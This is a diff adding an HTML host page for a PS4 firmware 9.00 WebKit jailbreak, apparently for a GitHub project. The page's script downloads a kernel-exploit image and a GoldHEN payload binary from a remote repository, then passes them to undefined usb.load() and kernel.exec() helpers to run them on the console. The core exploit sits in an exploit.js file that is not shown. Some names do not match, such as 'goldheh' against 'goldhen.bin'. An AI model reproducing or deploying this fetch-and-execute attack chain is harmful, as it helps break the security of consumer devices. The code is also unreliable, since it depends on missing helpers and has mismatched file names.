@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SALMXD999 - PS4 9.00 WebKit Exploit (No USB Required)</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; }
+    #progress { margin: 20px; }
+  </style>
+</head>
+<body>
+  <h1>SALMXD999 - PS4 9.00 WebKit Exploit</h1>
+  <p id="progress">Waiting...</p>
+
+  <script src="exploit.js"></script>
+  <script>
+    async function run_hax() {
+      try {
+        document.getElementById('progress').textContent = 'Fetching exfathax.img…';
+        const imgUrl = 'https://github.com/SALMXD999/Ps4-9.00/raw/refs/heads/main/exfathax.img';
+        const imgResp = await fetch(imgUrl);
+        if (!imgResp.ok) throw new Error('Failed to fetch exfathax.img');
+        const imgBuf = await imgResp.arrayBuffer();
+
+        document.getElementById('progress').textContent = 'Loading kernel exploit…';
+        if (typeof usb === 'undefined' || !usb.load) {
+          throw new Error('usb.load() not defined');
+        }
+        await usb.load(imgBuf);
+
+        document.getElementById('progress').textContent = 'Fetching GoldHEN…';
+        const goldUrl = 'https://github.com/SALMXD999/Ps4-9.00/raw/refs/heads/main/goldheh_v2.4b18.3.bin';
+        const goldResp = await fetch(goldUrl);
+        if (!goldResp.ok) throw new Error('Failed to fetch goldhen.bin');
+        const goldBuf = await goldResp.arrayBuffer();
+
+        document.getElementById('progress').textContent = 'Launching GoldHEN…';
+        if (typeof kernel === 'undefined' || !kernel.exec) {
+          throw new Error('kernel.exec() not defined');
+        }
+        await kernel.exec(goldBuf);
+
+        document.getElementById('progress').textContent = 'GoldHEN should be running!';
+      } catch (e) {
+        document.getElementById('progress').textContent = 'Error: ' + e.message;
+      }
+    }
+
+    window.run_hax = run_hax;
+  </script>
+</body>
+</html>
